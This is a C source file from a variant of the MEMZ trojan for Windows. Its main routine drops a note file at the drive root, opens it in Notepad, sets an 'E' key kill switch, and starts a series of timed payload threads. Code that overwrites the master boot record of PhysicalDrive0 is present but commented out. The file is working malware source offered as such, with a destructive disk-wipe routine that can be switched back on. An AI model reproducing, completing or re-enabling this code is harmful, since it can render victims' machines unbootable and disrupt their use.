#include "..\MEMZ.h"
char KillMessage[2000];
#include "..\resource.h"
#ifndef CLEAN
DWORD WINAPI Thread(LPVOID s)
{
	while (!GetAsyncKeyState('E'))
	{
		Sleep(40);
	}
	ExitProcess(5);
	return 0;
}
int main(int argc, char *argv) {
	
//	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

//	if (drive == INVALID_HANDLE_VALUE)
	//	ExitProcess(2);

//	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	/*int i = 0;
	for (; i < mbrStage1Len; i++)
		*(bootcode + i) = *(mbrStage1 + i);
	for (i = 0; i < mbrStage2Len; i++)
		*(bootcode + i + 0x1fe) = *(mbrStage2 + i);*/

	DWORD wb;
//	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
	//	ExitProcess(3);

//	CloseHandle(drive);
	
	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);
	char buf[255];
	LoadStringA(GetModuleHandleA(NULL), NOTE, buf, sizeof buf);
	if (!WriteFile(note, buf, sizeof buf, &wb, NULL))
		ExitProcess(5);

	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
	CreateThread(0, 0, &Thread, 0, 0, 0);
	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].startDelay);
		
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
}
#endif